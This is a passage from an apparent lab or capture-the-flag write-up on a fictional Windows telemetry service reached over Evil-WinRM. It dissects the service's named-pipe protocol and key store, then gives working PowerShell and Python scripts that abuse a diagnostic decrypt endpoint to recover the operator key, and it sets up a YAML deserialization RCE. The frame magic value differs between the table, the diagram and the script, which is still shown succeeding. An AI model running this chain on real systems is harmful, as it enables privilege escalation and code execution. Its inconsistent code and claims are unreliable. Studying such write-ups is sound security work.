			return NamedPipeServerStreamAcl.Create("AegisStreamMgmt", PipeDirection.InOut, -1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 65536, 65536, pipeSecurity, HandleInheritability.None, (PipeAccessRights)0);
		}
```

The pipe path is `\\.\pipe\AegisStreamMgmt`. Five security principals are written into the pipe's ACL. `SYSTEM` and `BuiltinAdministrators` get `FullControl`. Three named NT groups get a precise read/write/attribute/sync subset — enough to do RPC-style request/response but not enough to, e.g., change the pipe's ACL. 

One of the groups is the group we belong to - `AegisStream-Viewers`. The three NT groups need to exist for any non-Admin client to even connect. That's a Windows kernel-level gate. It is a coarse filter - being in `AegisStream-Viewers` lets you open the pipe, nothing more. The fine-grained call still has to authenticate at the protocol layer, which is where we go next. 

Let's verify the pipe is live.

```shell
*Evil-WinRM* PS C:\Program Files\Aegis Stream Collector> [IO.Directory]::GetFiles("\\.\pipe\") | Where-Object { $_ -match "Aegis" }
\\.\pipe\AegisStreamMgmt
```

The methods on `PipeServerWorker` all take Frame objects, so Frame is what travels on the pipe. Going to `AegisStream.Common/Frame.cs`:

```c#
 public sealed class Frame {
 	 public byte[] BodyForSignature();
 	 ...
 	 public byte[] Serialize();
 	 ...
   public static Task<Frame?> ReadFromAsync(Stream s, CancellationToken ct);
   ...
   public Task       WriteToAsync (Stream s, CancellationToken ct);
   ...
   private static Task<bool> ReadExactAsync(Stream stream, byte[] buf, CancellationToken ct)
   ...
   	public uint Magic;
    public uint ReqId;
    public string OpCode = string.Empty;
    public byte[] Payload = Array.Empty<byte>();
    public byte[] Signature = new byte[32];  // 32 == SHA-256 output
  }
```

`ReadFromAsync` and `WriteToAsync` are state-machine stubs in the decompile. We don't need their bodies - `Serialize()` is concrete and fixes the wire format completely:

```c#
  public byte[] Serialize()
  {
    byte[] bytes = Encoding.UTF8.GetBytes(this.OpCode);
    byte[] array = new byte[10 + bytes.Length + 4 + this.Payload.Length + 32];
    Span<byte> destination = array.AsSpan<byte>();
    BinaryPrimitives.WriteUInt32LittleEndian(destination, this.Magic);
    ref Span<byte> ptr = ref destination;
    BinaryPrimitives.WriteUInt32LittleEndian(ptr.Slice(4, ptr.Length - 4), this.ReqId);
    ptr = ref destination;
    BinaryPrimitives.WriteUInt16LittleEndian(ptr.Slice(8, ptr.Length - 8), (ushort)bytes.Length);
    byte[] source = bytes;
    ptr = ref destination;
    source.CopyTo(ptr.Slice(10, ptr.Length - 10));
    int num = 10 + bytes.Length;
    ptr = ref destination;
    int num2 = num;
    BinaryPrimitives.WriteUInt32LittleEndian(ptr.Slice(num2, ptr.Length - num2), (uint)this.Payload.Length);
    byte[] payload = this.Payload;
    ptr = ref destination;
    num2 = num + 4;
    payload.CopyTo(ptr.Slice(num2, ptr.Length - num2));
    byte[] signature = this.Signature;
    ptr = ref destination;
    num2 = num + 4 + this.Payload.Length;
    signature.CopyTo(ptr.Slice(num2, ptr.Length - num2));
    return array;
  }
```

Reading this back into an offset table:

```
 offset   size      field
   0       4        Magic       (uint32 LE; Constants.FrameMagic = 0xA3 95 8B EB)
   4       4        ReqId       (uint32 LE; client-chosen, echoed in replies)
   8       2        OpLen       (uint16 LE)
  10       OpLen    OpCode      (UTF-8, no null)
  10+OL    4       PayloadLen   (uint32 LE)
  14+OL    PL      Payload      (opaque — usually JSON)
  14+OL+PL 32      Signature    (HMAC-SHA256)
```

What does the signature cover? That's `BodyForSignature`:

```c#
public byte[] BodyForSignature()
{
  byte[] bytes = Encoding.UTF8.GetBytes(this.OpCode);
  byte[] array = new byte[bytes.Length + this.Payload.Length];
  bytes.CopyTo(array, 0);
  this.Payload.CopyTo(array, bytes.Length);
  return array;
}
```

The signed input is only `OpCode || Payload`. We don't yet know what `HMAC` key is in play. That belongs to `KeyStore`.

```c#
public byte[] ViewerKey  { get { return _viewerKey  ?? throw new InvalidOperationException("viewer key not loaded"); } }
public byte[] AuditorKey { get { return _auditorKey ?? throw new InvalidOperationException("auditor key not loaded"); } }
public byte[] OperatorKey { get { return _operatorKey ?? throw new InvalidOperationException("operator key not loaded"); } }
```

These have to be set somewhere. The only setter is `LoadOrBootstrap`.

```c#
public void LoadOrBootstrap()
{
  KeyStore.EnsureDataDirs();
  if (!File.Exists("C:\\ProgramData\\AegisStream\\keys\\viewer.key"))
  {
    KeyStore.GenerateAndWriteCleartext("C:\\ProgramData\\AegisStream\\keys\\viewer.key");
  }
  if (!File.Exists("C:\\ProgramData\\AegisStream\\keys\\auditor.key"))
  {
    KeyStore.GenerateAndWriteCleartext("C:\\ProgramData\\AegisStream\\keys\\auditor.key");
  }
  if (!File.Exists("C:\\ProgramData\\AegisStream\\keys\\operator.key"))
  {
    KeyStore.GenerateAndWriteCleartext("C:\\ProgramData\\AegisStream\\keys\\operator.key");
  }
  if (!File.Exists("C:\\ProgramData\\AegisStream\\keys\\operator.key.enc") || !File.Exists("C:\\ProgramData\\AegisStream\\dpapi\\operator.wrap.bin"))
  {
    KeyStore.BootstrapOperatorEncryption();
  }
  this._viewerKey = File.ReadAllBytes("C:\\ProgramData\\AegisStream\\keys\\viewer.key");
  this._auditorKey = File.ReadAllBytes("C:\\ProgramData\\AegisStream\\keys\\auditor.key");
  this._operatorKey = KeyStore.LoadOperatorKeyEncrypted();
  this._log.LogInformation("AegisStream key store ready (Sov-Sec-22 §A.2 / §B.2).", Array.Empty<object>());
}
```

The shape: viewer and auditor keys are 32 bytes of random sitting in clear-text files. The operator key is also generated as a 32-byte cleartext file - but then `BootstrapOperatorEncryption` produces two additional artifacts, and `LoadOperatorKeyEncrypted` reads from those, not from the cleartext file. Reading the bootstrap:

```c#
private static void BootstrapOperatorEncryption()
{
  byte[] plaintext = File.ReadAllBytes("C:\\ProgramData\\AegisStream\\keys\\operator.key");
  byte[] array = new byte[32];
  RandomNumberGenerator.Fill(array);
  byte[] bytes = AesGcmUtil.Encrypt(array, plaintext);
  File.WriteAllBytes("C:\\ProgramData\\AegisStream\\keys\\operator.key.enc", bytes);
  byte[] bytes2 = ProtectedData.Protect(array, null, DataProtectionScope.CurrentUser);
  File.WriteAllBytes("C:\\ProgramData\\AegisStream\\dpapi\\operator.wrap.bin", bytes2);
  Array.Clear(array);
}
```

```c#
private static byte[] LoadOperatorKeyEncrypted()
{
  byte[] encryptedData = File.ReadAllBytes("C:\\ProgramData\\AegisStream\\dpapi\\operator.wrap.bin");
  byte[] array = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
  byte[] result;
  try
  {
    byte[] blob = File.ReadAllBytes("C:\\ProgramData\\AegisStream\\keys\\operator.key.enc");
    result = AesGcmUtil.Decrypt(array, blob);
  }
  finally
  {
    Array.Clear(array);
  }
  return result;
}
```

The intent reads cleanly:

 ```
 operator.key  → AES-GCM(kek, ·) → operator.key.enc
 kek      → DPAPI(CurrentUser, ·) → operator.wrap.bin
 ```

Only an entity that can `DPAPI-unprotect` under the service account can recover `kek`, and without `kek` nobody can decrypt `operator.key.enc`. The operator key (the highest-privilege role key) is meant to be the one key that isn't sitting in cleartext at rest. Except for one detail that's easy to miss but completely undermines the protection: the `Bootstrap` never deletes the cleartext `operator.key`. It reads it as input and never touches it again. After the first run, the directory contains:

``` 
C:\ProgramData\AegisStream\keys\
    viewer.key     ← 32 bytes random, cleartext
    auditor.key    ← 32 bytes random, cleartext
    operator.key    ← 32 bytes random, CLEARTEXT (still here)
    operator.key.enc  ← AES-GCM(kek, operator.key)
```

Which is exactly what we saw during enumeration. We could not access the `operator.key` because the application runs under `svc-aegis-stream`, so the key was generated under another user/group context.

Going back to `Role.cs`:

```c#
namespace AegisStream.Common
{
	// Token: 0x02000007 RID: 7
	public enum Role
	{
		// Token: 0x04000028 RID: 40
		None,
		// Token: 0x04000029 RID: 41
		Viewer = 10,
		// Token: 0x0400002A RID: 42
		Auditor = 20,
		// Token: 0x0400002B RID: 43
		Operator = 30
	}
}
```

The deliberate gaps (0/10/20/30), plus the existence of `MinRoles`, plus the fact that handlers will accept either the listed minimum role or higher (we'll confirm this in a moment), tell us that authorization compares as `int >=` on the enum value. `Operator` does everything `Auditor` does, which does everything `Viewer` does.

The one auth-related method in `PipeServerWorker` that decompiles fully is the `InferRoleFromeSignature` method.

```c#
private Role InferRoleFromSignature(Frame frame)
{
  byte[] data = frame.BodyForSignature();
  ValueTuple<Role, byte[]>[] array = new ValueTuple<Role, byte[]>[]
  {
    new ValueTuple<Role, byte[]>(Role.Operator, this._keys.OperatorKey),
    new ValueTuple<Role, byte[]>(Role.Auditor, this._keys.AuditorKey),
    new ValueTuple<Role, byte[]>(Role.Viewer, this._keys.ViewerKey)
  };
  foreach (ValueTuple<Role, byte[]> valueTuple in array)
  {
    Role item = valueTuple.Item1;
    byte[] item2 = valueTuple.Item2;
    byte[] a = HmacUtil.ComputeHmacSha256(item2, data);
    if (HmacUtil.ConstantTimeEquals(a, frame.Signature))
    {
      return item;
    }
  }
  return Role.None;
} 
```

The shape of this is worth dwelling on. The client does not declare its role. The server discovers it by trying all three keys against the inbound signature. Whichever key verifies - that's the role. There's no way for the server to say, "This connection must be a `Viewer`." Possession of a higher-privilege key implicitly grants its level. The pipe ACL groups (`AegisStream-Operators` etc.) are unrelated to which key the caller presents - being in `AegisStream-Operators` just lets you open the pipe. `Role.None` means no key matched. Every handler will refuse `Role.None` (we'll see this in the dispatch table next).

```
["STREAM_LIST"]         = Role.Viewer,
["STREAM_GET"]         = Role.Viewer,
["STREAM_METRICS"]       = Role.Auditor,
["STREAM_REPLAY"]        = Role.Auditor,
["DIAG_DECRYPT_TELEMETRY_BLOB"] = Role.Viewer,
["CONFIG_EXPORT"]        = Role.Operator,
["CONFIG_IMPORT"]        = Role.Operator,
["MAINT_RELOAD"]        = Role.Operator,
```

Dispatch's body is hidden in an async state machine, but with `InferRoleFromSignature` plus `MinRoles` and the available handlers, there's exactly one reasonable shape it can have:

```c#
if (!MinRoles.TryGetValue(frame.OpCode, out Role required)) {
  await Reply(pipe, frame.ReqId, "UNKNOWN_OPCODE", null, ct);
  return;
}
Role caller = InferRoleFromSignature(frame);
if ((int)caller < (int)required) {
  await Reply(pipe, frame.ReqId, "FORBIDDEN", null, ct);
  return;
}
switch (frame.OpCode) {
  case "STREAM_LIST":         await HandleStreamList  (pipe, frame.ReqId, ct); break;
  case "STREAM_GET":         await HandleStreamGet  (pipe, frame, ct);    break;
  case "STREAM_METRICS":       await HandleStreamMetrics(pipe, frame, ct);    break;
  case "STREAM_REPLAY":        await HandleStreamReplay (pipe, frame, ct);    break;
  case "DIAG_DECRYPT_TELEMETRY_BLOB": await HandleDiagDecrypt (pipe, frame, ct);    break;
  case "CONFIG_EXPORT":        await HandleConfigExport (pipe, frame.ReqId, ct); break;
  case "CONFIG_IMPORT":        await HandleConfigImport (pipe, frame, ct);    break;
  case "MAINT_RELOAD":        await HandleMaintReload (pipe, frame.ReqId, ct); break;
}
```

The handler signatures themselves leak structure. Three of them take only (pipe, reqId, ct) — `STREAM_LIST`, `CONFIG_EXPORT`, `MAINT_RELOAD` — so those have empty payloads; the request is "do this thing, send me the result." The other five take the whole frame, so their payloads carry parameters.

We've talked about the protocol; now, what data flows through it? The handlers all touch `_telemetry`, which is `TelemetryStore`. That class is small enough to reason about completely:

```c#
 public sealed class TelemetryStore {
    private readonly List<TelemetryStream> _streams = new();
    private readonly object _gate = new();

   public void Load() {
      lock (_gate) {
        _streams.Clear();
        if (!File.Exists(@"C:\ProgramData\AegisStream\telemetry\current.bin")) {
          _log.LogInformation("telemetry/current.bin absent; starting with empty buffer.");
          return;
        }
        try {
          string json = File.ReadAllText(@"C:\ProgramData\AegisStream\telemetry\current.bin");
          var list = JsonSerializer.Deserialize<List<TelemetryStream>>(json,
            new JsonSerializerOptions { PropertyNameCaseInsensitive = true });
          if (list != null) _streams.AddRange(list);
          _log.LogInformation("loaded {n} telemetry streams from current.bin", _streams.Count);
        } catch (Exception ex) {
          _log.LogWarning(ex, "telemetry parse failed; buffer left empty");
        }
      }
    }
  
    public IReadOnlyList<TelemetryStream> ListStreams() {
      lock (_gate) { return _streams.ToList(); }  // defensive snapshot
    }
  
    public TelemetryStream? Get(string id) {
      lock (_gate) { return _streams.FirstOrDefault(s => s.StreamId == id); }
    }
  }
```

`ConfigManager` is the only class that looks odd in the overall structure.

```c#
public ConfigManager(ILogger<ConfigManager> log)
		{
			this._log = log;
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002598 File Offset: 0x00000798
		public string ExportYaml()
		{
			ISerializer serializer = new SerializerBuilder().Build();
			ISerializer serializer2 = serializer;
			object graph;
			if ((graph = this._current) == null)
			{
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary["service"] = "aegis-stream-collector";
				dictionary["version"] = "1.4.2";
				dictionary["state"] = "ready";
				graph = dictionary;
				string key = "compat";
				Dictionary<string, object> dictionary2 = new Dictionary<string, object>();
				dictionary2["v1_export_format"] = true;
				dictionary2["since"] = "Sov-Sec-22 §A.4";
				dictionary[key] = dictionary2;
			}
			return serializer2.Serialize(graph);
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002626 File Offset: 0x00000826
		[NullableContext(2)]
		public void Apply(object config)
		{
			this._current = config;
			this._log.LogInformation("config import applied (root type {t}).", new object[]
			{
				((config != null) ? config.GetType().FullName : null) ?? "<null>"
			});
		}

		// Token: 0x0400000B RID: 11
		private readonly ILogger<ConfigManager> _log;

		// Token: 0x0400000C RID: 12
		[Nullable(2)]
		private object _current;
	}
```

The model is: 

Export - if any config was ever imported, dump it as `YAML`. Otherwise, serialize a hard-coded "default" advertising service name `aegis-stream-collector`, version `1.4.2`, state ready, and a compat block citing `"Sov-Sec-22 §A.4"`. 

Then, Apply - store the (untyped, unvalidated) object handed to it. Log its runtime type.  `_current` is in-memory only, so a service restart loses it, and `ExportYaml()` falls back to the defaults. 

Combined with `MAINT_RELOAD` and the fact that the actual `current.bin` for elemetry is read from disk separately, this looks like an in-flight diagnostic config surface, not a persistent configuration system.

We can now stitch the pieces back into a single mental model. Here's what a complete round-trip looks like:

```shell
 Client                                            AegisStreamSvc
  ──────                                           ──────────────
1. open \\.\pipe\AegisStreamMgmt

   → kernel ACL: must be SYSTEM, Admin, or
    in one of the three AegisStream-* NT groups.

2. craft Frame:

    Magic  = 0xEB8B95A3
    ReqId  = <client-chosen>
    OpCode  = "STREAM_GET"
    Payload = UTF8(`{"streamId":"abc"}`)
    Sig   = HMAC-SHA256(viewer.key, "STREAM_GET" || payload)
   serialize → 10 + opLen + 4 + payloadLen + 32 bytes

3. WriteToAsync() ──────────────────────────────────► HandleClient(pipe, ct):

                             Frame.ReadFromAsync
                             InferRoleFromSignature(frame)
                               → tries Operator, Auditor, Viewer
                               → matches Viewer
                             Dispatch:
                               MinRoles["STREAM_GET"] = Viewer ≤ Viewer ✓
                               HandleStreamGet:
                                _telemetry.Get("abc")
                                → TelemetryStream
                                JSON-encode
                                Reply(reqId, "OK", json)

4. Frame.ReadFromAsync() ◄───────────────────────────

    OpCode = "OK"
    ReqId  = <echoed>
    Payload = JSON of TelemetryStream
    Sig   = HMAC-SHA256(viewer.key, "OK" || payload)
```

As we saw earlier, the application offers a multitude of handlers. For the sake of this writeup's length, we will focus only on the ones relevant to the path. The first one that we will focus on is `DIAG_DECRYPT_TELEMETRY_BLOB` (`HandleDiagDecrypt`).

Before any handler can be reasoned about, the cryptographic primitives the binary actually has to work with need to be enumerated. The `AegisStream.Common` assembly exposes two small, plain helpers. The first is `HmacUtil`:

```c#
 public static byte[] ComputeHmacSha256(byte[] key, byte[] data) => HMACSHA256.HashData(key, data);
  public static bool  ConstantTimeEquals (byte[] a,  byte[] b) => CryptographicOperations.FixedTimeEquals(a, b);
```

This one is exclusively used for frame signatures - `PipeServerWorker.InferRoleFromSignature` consumes it directly. It's a signing primitive, not a decryption primitive, so it's not a candidate for any handler whose name contains "DECRYPT."

The second is `AesGcmUtil`, which is the only symmetric-encryption helper in the codebase:

```c#
 public static byte[] Encrypt(byte[] key, byte[] plaintext) {
    byte[] nonce = new byte[12]; RandomNumberGenerator.Fill(nonce);
    byte[] tag  = new byte[16];
    byte[] ct  = new byte[plaintext.Length];
    using (var aes = new AesGcm(key, 16)) {
      aes.Encrypt(nonce, plaintext, ct, tag, null);  // last arg = AAD
    }
    byte[] blob = new byte[12 + 16 + ct.Length];
    nonce.CopyTo(blob, 0);
    tag .CopyTo(blob, 12);
    ct  .CopyTo(blob, 28);
    return blob;
  }

public static byte[] Decrypt(byte[] key, byte[] blob) {
    byte[] nonce = blob.AsSpan( 0, 12).ToArray();
    byte[] tag  = blob.AsSpan(12, 16).ToArray();
    byte[] ct  = blob.AsSpan(28).ToArray();
    byte[] pt  = new byte[ct.Length];
    using (var aes = new AesGcm(key, 16)) {
      aes.Decrypt(nonce, ct, tag, pt, null);
    }
    return pt;
  }
```

Two structural properties of this helper are worth pinning down because they will matter for the handler analysis: The blob format is fully self-describing: `[nonce(12)] [tag(16)] [ciphertext(N)]`. A caller who supplies a blob in that exact shape gets either the plaintext (on success) or a `CryptographicException` from the `AES-GCM` tag check (on failure). That cleanly distinguishable success/failure split is what makes any handler that wraps this primitive a candidate for the oracle pattern.

The fifth parameter to `AesGcm.Encrypt / AesGcm.Decrypt` is the `AAD (Associated Authenticated Data)` - the data that gets authenticated but not encrypted. The helper passes null in both directions. That means nothing in the wrap binds a ciphertext to its purpose, key id, version, or scope. A blob encrypted under key K for purpose X can be presented to any call that decrypts with key K and will verify exactly the same as a blob encrypted for purpose Y. There is no internal type-tag protecting against blob mixing. This is the property that converts "decrypt operation" into "general-purpose decryption oracle" if the caller can pick the blob.

`AesGcmUtil` is not, however, the only decryption primitive in the codebase. The other is `ProtectedData`, which appears in `KeyStore` for the operator-key bootstrap:

```c#
byte[] wrappedKek = File.ReadAllBytes(@"C:\ProgramData\AegisStream\dpapi\operator.wrap.bin");
byte[] kek    = ProtectedData.Unprotect(wrappedKek, null, DataProtectionScope.CurrentUser);
```

This is `Windows DPAPI`. `ProtectedData.Unprotect` decrypts any blob produced by `ProtectedData.Protect` under the same scope from the same security principal - in this case, whichever user account runs the service. It has no per-call "key" parameter; the implicit key is derived from the service account's credential material, managed by the OS.

Both fit the structural profile of an oracle. We now know what tools are on the table; the next question is which one (or which combination) `HandleDiagDecrypt` (`DIAG_DECRYPT_TELEMETRY_BLOB`) reaches for.

- `DIAG_` separates this from the `STREAM_*`, `CONFIG_*`, and `MAINT_*` families - it is a diagnostic operation, not part of any normal data-path. 
- `DECRYPT_` says the operation is decryption. 
- `TELEMETRY_BLOB` names the kind of object being decrypted. 

The expected use, by the name alone, is "operator presents a blob; service hands back what's inside." These facts lead us to a hypothesis that `HandleDiagDecrypt` uses the `Windows DPAPI` unprotect method. The relevant blobs are anything the service account can Unprotect - i.e., any `DPAPI` blob created by the same security principal. In particular, it includes the file that `KeyStore.BootstrapOperatorEncryption` writes to disk:

```c#
byte[] bytes2 = ProtectedData.Protect(array, null, DataProtectionScope.CurrentUser);
File.WriteAllBytes("C:\\ProgramData\\AegisStream\\dpapi\\operator.wrap.bin", bytes2);
```

`operator.wrap.bin` is the DPAPI-protected key-encryption-key that wraps the operator key. It is, by construction, the kind of blob `ProtectedData.Unprotect` decrypts under the service's `CurrentUser` scope. In addition to that, we verified earlier that we cannot access `operator.key`, probably because it was generated under the running user's context. Since we know the app is running, we can assume that this key was decrypted under the running user's context using this method.

`Role.Viewer (= 10)` is the lowest non-None role. This endpoint is reachable by any caller who can sign a frame at all. That is the broadest privilege level the protocol permits - narrower than the pipe ACL (which permits SYSTEM, Admins, and three NT groups), but as broad as the protocol's own authentication will allow.

If our assumption is true, there is a very strong security breach:

1. A `Viewer`-level caller (which svc-aegis-deploy is) reads `operator.wrap.bin` directly off disk.
2. They submit those bytes as the payload of a `DIAG_DECRYPT_TELEMETRY_BLOB` frame, signed with the `Viewer` key they already have.
3. The service treats them as a `Viewer` (passes the `MinRoles` gate), unwraps the `DPAPI` blob under its own account's credentials, and replies "OK" with the plaintext `KEK` as the body.
4. The caller now has `kek`. They read `operator.key.enc` (also on disk, same loose ACL story) and run `AesGcmUtil.Decrypt(kek, …)` themselves.
5. The plaintext that comes out is the `operator key`.
6. With the `operator key`, the same caller can now sign frames as `Operator` and call `CONFIG_IMPORT`, `MAINT_RELOAD`, and `CONFIG_EXPORT` — the entire `Operator`-tier surface.

We have dissected the application's architecture, so now it is time to put our hypothesis to the test by building a client that will interact with the `HandleDiagDecrypt` handle. We will use `PowerShell` to interact with it directly from our `WinRM` session.

The `viewer.key` is what we'll sign our frame with. The `DPAPI-wrapped KEK` is the blob we're going to send through the diagnostic decrypt endpoint.

```powershell
$viewerKey = [IO.File]::ReadAllBytes('C:/ProgramData/AegisStream/keys/viewer.key')
$wrapBlob = [IO.File]::ReadAllBytes('C:/ProgramData/AegisStream/dpapi/operator.wrap.bin')
```

The opcode rides on the wire as raw `UTF-8` bytes (no null terminator, no length prefix yet - the length goes into a separate field later). We hold onto the byte form because we'll need it both inside the signature input and inside the frame.

```powershell
$opBytes = [Text.Encoding]::UTF8.GetBytes('DIAG_DECRYPT_TELEMETRY_BLOB')
```

The signature is `HMAC-SHA256` keyed with the viewer key, computed over `OpCode || Payload`. We allocate a buffer of the combined length, copy each piece in, and hash.

```powershell
$hmac = New-Object System.Security.Cryptography.HMACSHA256(,$viewerKey)
$signData = New-Object byte[] ($opBytes.Length + $wrapBlob.Length)
[Array]::Copy($opBytes, 0, $signData, 0,         $opBytes.Length)
[Array]::Copy($wrapBlob, 0, $signData, $opBytes.Length,  $wrapBlob.Length)
$sig = $hmac.ComputeHash($signData)
```

The leading comma in `HMACSHA256(,$viewerKey)` is the `PowerShell` unary-array operator - it forces the byte array to be passed as a single argument instead of being splatted across the constructor's parameter list.

Now we lay the binary frame down field-by-field. The order is fixed: 4-byte magic, 4-byte request id, 2-byte opcode length followed by the opcode bytes, 4-byte payload length followed by the payload bytes, and finally the 32-byte signature. Every integer is little-endian.

```powershell
$ms = New-Object IO.MemoryStream
$bw = New-Object IO.BinaryWriter($ms)

$bw.Write([byte[]]@(0xAB, 0x5E, 0x91, 0xA3))       # Magic
$bw.Write([int32]1)                    # ReqId (any value; echoed back)
$bw.Write([int16]$opBytes.Length); $bw.Write($opBytes)  # OpLen | OpCode
$bw.Write([int32]$wrapBlob.Length); $bw.Write($wrapBlob) # PayloadLen | Payload
$bw.Write($sig)                      # Signature
$bw.Flush()
```

`BinaryWriter.Write` is little-endian by default on Windows `.NET`, which is what the protocol expects, so we don't have to byte-swap anything ourselves.

The path is `\\.\pipe\AegisStreamMgmt`. We want full-duplex (InOut), byte-mode, and - this part matters - we have to opt the client into at least Identification-level impersonation so the server can examine our token and check us against the pipe's `DACL`. Without that, the kernel denies the open before any of our bytes are ever read.

```powershell
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.','AegisStreamMgmt',[System.IO.Pipes.PipeDirection]: :InOut [System.IO.Pipes.PipeOptions]: :None, [System.Security.Principal.TokenImpersonationLevel]: :Identification)
$pipe.Connect(5000)
```

Now, send the frame. One `Write` for the assembled bytes, then a `Flush` so they actually leave the userland buffer instead of sitting there.

```powershell
$pipe.Write($ms.ToArray(), 0, $ms.Length)
$pipe.Flush()
```

The reply uses the same frame format. The `DPAPI-unwrapped KEK` is small (32 bytes of key material plus the framing overhead), so a generous single-shot read into a `128 KB` buffer is plenty.

```powershell
$buf = New-Object byte[] 131072
$n  = $pipe.Read($buf, 0, 131072)
$pipe.Dispose()
```

Now to parse the response frame, same offsets as outbound. Skip the first 8 bytes (magic + reqid), pull the 2-byte opcode length at offset 8, read that many opcode bytes, then the 4-byte payload length, then the payload itself.

```powershell
$rOpLen  = [BitConverter]::ToUInt16($buf, 8)
$rOpCode = [Text.Encoding]::UTF8.GetString($buf, 10, $rOpLen)
$rPlLen  = [BitConverter]::ToInt32($buf, 10 + $rOpLen)
$rPayload = New-Object byte[] $rPlLen
[Array]::Copy($buf, 14 + $rOpLen, $rPayload, 0, $rPlLen)
```

`$rOpCode` is the status string - "OK" on a successful decrypt. The payload of a successful reply is the unwrapped `KEK`. We write it to a file for reuse and print a hex form so it's visible in the terminal.

```powershell
[IO.File]::WriteAllBytes('C:/Users/svc-aegis-deploy/Documents/wrapper.bin', $rPayload)
Write-Output ("WRAPPER=" + [BitConverter]::ToString($rPayload).Replace('-',''))
```

The full `PowerShell` script saved as `oracle_decrypt.ps1`:

```powershell
#oracle_decrypt.ps1
$viewerKey = [IO.File]::ReadAllBytes('C:/ProgramData/AegisStream/keys/viewer.key')
$wrapBlob = [IO.File]::ReadAllBytes('C:/ProgramData/AegisStream/dpapi/operator.wrap.bin')
$opBytes = [Text.Encoding]::UTF8.GetBytes('DIAG_DECRYPT_TELEMETRY_BLOB')
$hmac = New-Object System.Security.Cryptography.HMACSHA256(,$viewerKey)
$signData = New-Object byte[] ($opBytes.Length + $wrapBlob.Length)
[Array]::Copy($opBytes, 0, $signData, 0, $opBytes.Length)
[Array]::Copy($wrapBlob, 0, $signData, $opBytes.Length, $wrapBlob.Length)
$sig = $hmac.ComputeHash($signData)
$ms = New-Object IO.MemoryStream
$bw = New-Object IO.BinaryWriter($ms)
$bw.Write([byte[]]@(0xAB, 0x5E, 0x91, 0xA3))
$bw.Write([int32]1)
$bw.Write([int16]$opBytes.Length); $bw.Write($opBytes)
$bw.Write([int32]$wrapBlob.Length); $bw.Write($wrapBlob)
$bw.Write($sig); $bw.Flush()
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.','AegisStreamMgmt',[System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None,[System.Security.Principal.TokenImpersonationLevel]::Identification)
$pipe.Connect(5000)
$pipe.Write($ms.ToArray(), 0, $ms.Length); $pipe.Flush()
$buf = New-Object byte[] 131072
$n = $pipe.Read($buf, 0, 131072); $pipe.Dispose()
$rOpLen = [BitConverter]::ToUInt16($buf, 8)
$rOpCode = [Text.Encoding]::UTF8.GetString($buf, 10, $rOpLen)
$rPlLen = [BitConverter]::ToInt32($buf, 10 + $rOpLen)
$rPayload = New-Object byte[] $rPlLen
[Array]::Copy($buf, 14 + $rOpLen, $rPayload, 0, $rPlLen)
[IO.File]::WriteAllBytes('C:/Users/svc-aegis-deploy/Documents/wrapper.bin', $rPayload)
Write-Output ("WRAPPER=" + [BitConverter]::ToString($rPayload).Replace('-',''))
```

We upload the script through our `WinRM` session and run it.

```shell
*Evil-WinRM* PS C:\Users\svc-aegis-deploy\Documents> ./oracle_decrypt.ps1
WRAPPER=D5742ED26151833792FFD2D821959E0F1B85A1F922157639A6C7EC90C094D658
```

Now we will download the `operator.key.enc` locally and decrypt it using `AESGCM`. We will use a `Python` script for this operation. First, we load the files in the script. The operator key is `b64` encoded for transport.

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64
wrapper = bytes.fromhex('D5742ED26151833792FFD2D821959E0F1B85A1F922157639A6C7EC90C094D658')
blob  = base64.b64decode('1TZcBcBcDvenMAy7WxkiJ/+MVOcAT1ri6P8T8WW1nBPuBv7YGBqHBdUu+xZpzbqRG4kCehfmy2bG70to')
```

The on-disk format is `[nonce(12) | tag(16) | ciphertext(N)]`, in that exact byte order. Three slices give us each piece.

```python
nonce, tag, ct = blob[:12], blob[12:28], blob[28:]
```

The cryptography library expects the cipher text and tag handed in as a single `ct || tag` concatenation - it strips the last 16 bytes off internally as the tag - with the nonce passed separately and AAD as a third parameter. The original encryption used `no AAD`, so we pass `None`. The `32-byte` wrapper makes this `AES-256`. Finally, we print the operator key.

```python
op_key = AESGCM(wrapper).decrypt(nonce, ct + tag, associated_data=None)
print(op_key.hex())
```

Full decryption script:

```python
# decrypt_operator.py  
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64
wrapper = bytes.fromhex('D5742ED26151833792FFD2D821959E0F1B85A1F922157639A6C7EC90C094D658')
blob = base64.b64decode('1TZcBcBcDvenMAy7WxkiJ/+MVOcAT1ri6P8T8WW1nBPuBv7YGBqHBdUu+xZpzbqRG4kCehfmy2bG70to')
nonce, tag, ct = blob[:12], blob[12:28], blob[28:]
op_key = AESGCM(wrapper).decrypt(nonce, ct + tag, associated_data=None)
print(op_key.hex())
```

```shell
$ python3 decrypt_operator.py                         
4b690afb33fd7f1bd2c4b36fce121b8b291352a5a0ed8632a0654422f401a83c
```

### YAML Deserialization RCE - Execution as svc-aegis-stream

With the operator key recovered, the entire `Operator`-tier surface is open. From the `MinRoles` table, three opcodes sit behind that gate: `CONFIG_EXPORT`, `CONFIG_IMPORT`, and `MAINT_RELOAD`. Of the three, only `CONFIG_IMPORT` takes the full frame - meaning it reads attacker-controlled payload. The other two take only `(pipe, reqId, ct)`: parameterless operations. 

`CONFIG_IMPORT` is therefore the interesting one. Before doing anything clever with it, the prudent first move is a bare connectivity test: send a trivial payload signed with the recovered operator key and see if the response says `OK` instead of `ROLE_DENIED`. That will confirm the key is correct and the handler is reachable. 

To know what to send, we need to read the handler. Stripping the async state-machine boilerplate from `HandleConfigImport`, the logic path is:

```
string yaml = Encoding.UTF8.GetString(frame.Payload);
IDeserializer deserializer = new DeserializerBuilder()
	.WithNodeTypeResolver(new TypeNameInTagNodeTypeResolver())
	.Build();
object config = deserializer.Deserialize<object>(new StringReader(yaml));
_config.Apply(config);
await Reply(pipe, frame.ReqId, "OK", null, ct);         
```

The payload is decoded as `UTF-8` and fed to a `YAML` deserializer. So our test payload needs to be a valid `YAML` document, not raw bytes. The target type is `object` with no further validation - the deserializer will accept literally anything that parses. On success, the handler replies "OK" with a null body, which `Reply` coerces to a zero-length payload (`body ?? Array.Empty<byte>()`). A successful round-trip will therefore have `rOpCode` == "OK" and `rPlLen` == 0.                        

